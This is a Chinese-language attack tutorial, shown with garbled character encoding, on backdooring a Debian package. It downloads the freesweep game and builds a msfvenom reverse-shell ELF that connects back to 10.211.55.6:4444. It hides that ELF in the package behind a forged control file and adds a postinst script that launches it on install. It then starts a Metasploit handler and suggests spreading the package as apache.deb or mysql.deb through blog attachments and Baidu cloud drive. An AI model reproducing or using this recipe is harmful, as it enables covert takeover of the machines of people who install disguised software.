åˆ¶ä½œdebè½¯ä»¶åŒ…è§¦å‘åé—¨
--download-only
ä¸‹è½½ä¸å®‰è£…
è½¯ä»¶æš‚å­˜ç›˜
cd /var/cache/apt/archives

ä¸‹è½½è½¯ä»¶
# apt install --download-only freesweep
# cd /var/cache/apt/archives
# cp /var/cache/apt/archives/freesweepXXX ~
# cd ~
# dpkg -x freesweepXXX free

ç”Ÿæˆæœ¨é©¬
â”Œâ”€â”€(rootğŸ’€kali-linux-2021-3)-[~]
â””â”€# msfvenom -a x64 --platform linux -p linux/x64/shell/reverse_tcp LHOST=10.211.55.6 LPORT=4444 -b "\x00" -i 10 -f elf -o /root/free/usr/games/freesweep_sources

ä¼ªè£…ç‰ˆæœ¬ä¿¡æ¯
mkdir -p /root/free/DEBIAN
â”Œâ”€â”€(rootğŸ’€kali-linux-2021-3)-[~]
â””â”€# tee /root/free/DEBIAN/control << 'EOF' 
Package:freesweep
Version:1.0.1-1
Section:Game
Priority:optional
Architecture:amd64
Maintainer:Ubuntu
Description:atext
EOF

#å†™è½¯ä»¶ç‰ˆæœ¬ä¿¡æ¯

åˆ›å»ºdebè½¯ä»¶åŒ…ï¼Œå®‰è£…åè„šæœ¬æ–‡ä»¶ï¼Œæ¥åŠ è½½æ–‡ä»¶
#å†™æ¶æ„è„šæœ¬ï¼Œå®‰è£…åæ‰§è¡Œæœ¨é©¬
# tee /root/free/DEBIAN/postinst << 'EOF'
#!/bin/bash
sudo chmod 2755 /usr/games/freesweep_sources
sudo /usr/games/freesweep_sources &
EOF

chmod 755 /root/free/DEBIAN/postinst

åˆ¶ä½œè½¯ä»¶
â”Œâ”€â”€(rootğŸ’€kali-linux-2021-3)-[~]
â””â”€# dpkg-deb --build /root/free


##å¼€å¯ç›‘å¬
â”Œâ”€â”€(rootğŸ’€kali-linux-2021-3)-[~]
â””â”€# msfdb run
åŒmsfconsole

msf6 > use exploit/multi/handler 
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
#æ”»å‡»è½½è·
msf6 exploit(multi/handler) > set LHOST 10.211.55.6
msf6 exploit(multi/handler) > show options
msf6 exploit(multi/handler) > run

#######è¿›è‚‰é¸¡å®‰è£…free.deb
dpkg -i free.deb


å®£ä¼ è½¯ä»¶åŒ…
åšå®¢çš„é™„ä»¶ä¸­æ”¾ï¼Œåå­—èµ·è§„èŒƒã€‚apache.deb,mysql.deb,ä¸‡èƒ½æ’­æ”¾å™¨.deb
ç™¾åº¦ç½‘ç›˜







































